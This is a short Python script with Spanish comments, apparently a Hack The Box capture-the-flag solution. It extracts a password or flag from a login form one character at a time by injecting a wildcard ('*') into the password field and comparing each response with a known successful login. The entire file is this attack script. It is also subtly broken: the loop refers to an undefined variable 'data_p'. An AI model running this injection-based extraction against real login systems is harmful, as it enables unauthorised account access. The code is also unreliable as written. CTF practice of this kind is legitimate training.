import requests
import os

url = "site_url"


false_credentials = {'username':'1234', 'password':'1234'}

false_response = requests.post(url, data=false_credentials).text

true_credentials = {'username':'Reese', 'password':'*'}

true_response = requests.post(url, data=true_credentials).text

data_pass = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","#","$","%","@","!","0","1","2","3","4","5","6","7","8","9","{","}","[","]","_","&","^"," "]

#Indicio de contraseña que se sabe funciona en la web, no es obligatorio usarla
test_pass = "HTB{"

def brute_force(test_pass,data_pass,true_response,url):

	url_ = url
	# Ciclo que validara cada caracter que contenga la lista de caracteres
	for i in data_p:
		input_data = {'username':'Reese','password':test_pass+i+"*"}
		test_requests = requests.post(url, data=input_data).text

		#Validación para cerrer script
		lista = list(test_pass)

		if lista.pop() == "}":
			exit()
		else:
			pass
		#Inicio de validación de contraseña	
		if test_requests == true_response:
			print(test_pass+i)
			test_pass = test_pass+i
			#Se ejecuta nuevamente para validar el siguiente caracter
			brute_force(test_pass,data_pass,true_response,url)
		else:
			os.system("clear")
			print(test_pass+i)
			
brute_force(test_pass,data_pass,true_response,url)
